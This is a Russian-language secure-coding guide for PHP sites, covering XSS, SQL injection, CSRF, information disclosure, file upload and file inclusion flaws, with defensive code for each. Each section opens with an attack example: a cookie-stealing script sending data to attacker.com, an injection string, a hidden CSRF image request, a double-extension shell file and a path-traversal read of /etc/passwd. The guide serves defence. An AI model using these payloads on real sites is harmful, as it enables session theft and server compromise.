1️⃣ XSS (Cross-Site Scripting)

Описание уязвимости:

Возможность внедрения вредоносного JavaScript кода в страницы сайта через пользовательский ввод.

Пример атаки:

<script>document.location='http://attacker.com/steal?cookie='+document.cookie</script>

Примененные методы защиты:

  • Экранирование всего пользовательского вывода через htmlspecialchars()
  • Создана функция escape() для централизованной защиты
  • Использование ENT_QUOTES для экранирования кавычек

Пример кода:

// Функция защиты от XSS
function escape($data) {
    return htmlspecialchars(trim($data), ENT_QUOTES, 'UTF-8');
}

// Использование в выводе
echo escape($_POST['username']);

2️⃣ SQL Injection

Описание уязвимости:

Внедрение вредоносного SQL-кода через пользовательский ввод для манипуляции базой данных.

Пример атаки:

' OR '1'='1' --

Примененные методы защиты:

  • Использование подготовленных выражений (Prepared Statements) PDO
  • Параметризация всех запросов
  • Экранирование данных через привязку параметров

Пример кода:

// Безопасный запрос с подготовленными выражениями
$stmt = $pdo->prepare("SELECT * FROM users WHERE username = ?");
$stmt->execute([$username]);
$user = $stmt->fetch(PDO::FETCH_ASSOC);

// Именованные параметры
$stmt = $pdo->prepare("INSERT INTO users (username, email) VALUES (:username, :email)");
$stmt->execute(['username' => $username, 'email' => $email]);

3️⃣ CSRF (Cross-Site Request Forgery)

Описание уязвимости:

Атака, при которой злоумышленник заставляет пользователя выполнить нежелательные действия на сайте, где он авторизован.

Пример атаки:

<img src="http://yoursite.com/transfer.php?amount=1000&to=attacker" width="0">

Примененные методы защиты:

  • Генерация уникального CSRF-токена для каждой сессии
  • Проверка токена во всех POST-запросах
  • Использование hash_equals() для защиты от timing attacks

Пример кода:

// Генерация токена
function generateCSRFToken() {
    if (!isset($_SESSION['csrf_token'])) {
        $_SESSION['csrf_token'] = bin2hex(random_bytes(32));
    }
    return $_SESSION['csrf_token'];
}

// Проверка токена
function verifyCSRFToken($token) {
    return isset($_SESSION['csrf_token']) && hash_equals($_SESSION['csrf_token'], $token);
}

// Использование в форме
<input type="hidden" name="csrf_token" value="<?= generateCSRFToken() ?>">

4️⃣ Information Disclosure

Описание уязвимости:

Раскрытие чувствительной информации: пути к файлам, SQL-запросы, версии ПО, ошибки БД.

Примененные методы защиты:

  • Отключение отображения ошибок (display_errors = Off)
  • Логирование ошибок в файл
  • Защита конфигурационных файлов через .htaccess
  • Отключение directory listing
  • Кастомизированные сообщения об ошибках

Пример кода:

# В .htaccess
php_flag display_errors off
php_flag log_errors on
php_value error_log /xampp/apache/logs/php_error.log

<Files "config.php">
    Order allow,deny
    Deny from all
</Files>

Options -Indexes

// В config.php
error_reporting(E_ALL);
ini_set('display_errors', 0);
ini_set('log_errors', 1);

5️⃣ File Upload Vulnerabilities

Описание уязвимости:

Загрузка вредоносных файлов (PHP-шеллы, вирусы) для компрометации сервера.

Пример атаки:

shell.php.jpg (с двойным расширением)

Примененные методы защиты:

  • Проверка MIME-типа через finfo_file()
  • Проверка расширения файла
  • Ограничение размера файла (2MB)
  • Генерация уникальных имен файлов
  • Хранение файлов вне web-root или с отключенным PHP
  • .htaccess с php_flag engine off в папке загрузок

Пример кода:

// Проверка MIME-типа
$finfo = finfo_open(FILEINFO_MIME_TYPE);
$mime_type = finfo_file($finfo, $_FILES['file']['tmp_name']);
finfo_close($finfo);

$allowed_types = ['image/jpeg', 'image/png', 'image/gif'];
if (!in_array($mime_type, $allowed_types)) {
    die('Недопустимый тип файла');
}

// Безопасное имя
$new_name = uniqid('file_', true) . '.' . $extension;

// Ограничение размера
if ($_FILES['file']['size'] > 2 * 1024 * 1024) {
    die('Файл слишком большой');
}

6️⃣ Include/Require Vulnerabilities

Описание уязвимости:

Local/Remote File Inclusion (LFI/RFI) - включение произвольных файлов с сервера или удаленного источника.

Пример атаки:

page.php?file=../../../../etc/passwd

Примененные методы защиты:

  • Использование жестко заданных путей
  • Отсутствие пользовательского ввода в include/require
  • Проверка существования директорий
  • Использование __DIR__ для абсолютных путей

Пример кода:

// Безопасное подключение
require __DIR__ . '/config.php';
require __DIR__ . '/lib/security.php';

// Проверка путей
$base_path = __DIR__;
if (!is_dir($base_path . '/lib')) {
    error_log('Critical: lib directory not found');
    die('System error');
}
